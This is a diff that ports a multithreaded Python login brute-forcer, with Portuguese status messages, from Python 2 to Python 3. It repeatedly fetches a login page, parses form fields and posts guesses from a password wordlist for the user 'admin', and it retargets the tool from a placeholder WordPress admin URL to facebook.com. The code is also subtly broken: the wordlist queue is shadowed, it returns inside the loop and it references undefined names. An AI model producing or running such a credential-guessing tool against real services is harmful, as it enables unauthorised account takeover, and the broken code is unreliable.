@@ -1,21 +1,22 @@
+# -*- coding: utf-8 -*-
 #!/usr/bin/env python
 
 import urllib
-import urllib2
-import cookielib
+import urllib.request as urllib2
+import http.cookiejar as cookielib
 import threading
 import sys
-import Queue
-
-from HTMLParser import HTMLParser
+from queue import Queue
+import queue
+from html.parser import HTMLParser
 
 user_thread = 10
 username = "admin"
 wordlist_file = "passwords.txt"
 resume = None
 
-target_url = "http://minhaurl/wordpress/wp-admin"
-target_post = "http://minhaurl/wordpress/wp-admin"
+target_url = "http://facebook.com"
+target_post = "http://facebook.com"
 
 username_field = "username"
 password_field = "passwd"
@@ -26,7 +27,7 @@ class BruteParser(HTMLParser):
 	def __init__(self):
 		HTMLParser.__init__(self)
 		self.tag_results = {}
-		
+
 	def handle_starttag(self, tag, attrs):
 		if tag == "input":
 			tag_name = None
@@ -36,7 +37,7 @@ class BruteParser(HTMLParser):
 					tag_name = value
 				if name == "value":
 					tag_name = value
-					
+
 			if tag_name is not None:
 				self.tag_results[tag_name] = value
 
@@ -45,14 +46,14 @@ class Bruter(object):
 		self.username = username
 		self.password_q = words
 		self.found = False
-		
-		print "Configuração concluída para: %s" % username
-	
-	def run_bruteforce(self)
+
+		print ("Configuração concluída para: %s" % username)
+
+	def run_bruteforce(self):
 		for i in range(user_thread):
-		t = threading.Thread(target=self.web_bruter)
-		t.start()
-		
+			t = threading.Thread(target=self.web_bruter)
+			t.start()
+
 	def web_bruter(self):
 		while not self.password_q.empty() and not self.found:
 			brute = self.password_q.get().rstrip()
@@ -60,10 +61,8 @@ class Bruter(object):
 			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
 			response = opener.open(target_url)
 			page = response.read()
-			print "Tentando: %s : %s (%d left)" %
+			print ("Tentando: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize()))
 
-(self.username,brute,self.password_q.qsize())
-			
 			parser = BruteParser()
 			parser.feed(page)
 			post_tags = parser.tag_results
@@ -72,21 +71,21 @@ class Bruter(object):
 			login_data = urllib.urlencode(post_tags)
 			login_response = opener.open(target_post, login_data)
 			login_result = login_response.read()
-			
+
 			if success_check in login_result:
 				self.found = True
-				print "[*] Bruteforce realizado com sucesso"
-				print "[*] Username: %s" % username
-				print "[*] Password: %s" % brute
-				
+				print ("[*] Bruteforce realizado com sucesso")
+				print ("[*] Username: %s" % username)
+				print ("[*] Password: %s" % brute)
+
 def build_wordlist(wordlist_file):
 	fd = open(wordlist_file, "rb")
 	raw_words = fd.readlines()
 	fd.close()
-	
-	found_resume = false
-	word = Queue.Queue()
-	
+
+	found_resume = False
+	word = queue.Queue()
+
 	for word in raw_words:
 		word = word.rstrip()
 		if resume is not None:
@@ -95,12 +94,9 @@ def build_wordlist(wordlist_file):
 			else:
 				if word == resume:
 					found_resume = True
-					print "Retomando a lista de palavras de: %s" % resume
-			else:
-				words.put(word)
-		return words
-		
-words = build_wordlist(wordlist_file)
+					print ("Retomando a lista de palavras de: %s" % resume)
+				else:
+					words.put(word)
+					return words
 
-		
-	
+words = build_wordlist(wordlist_file)
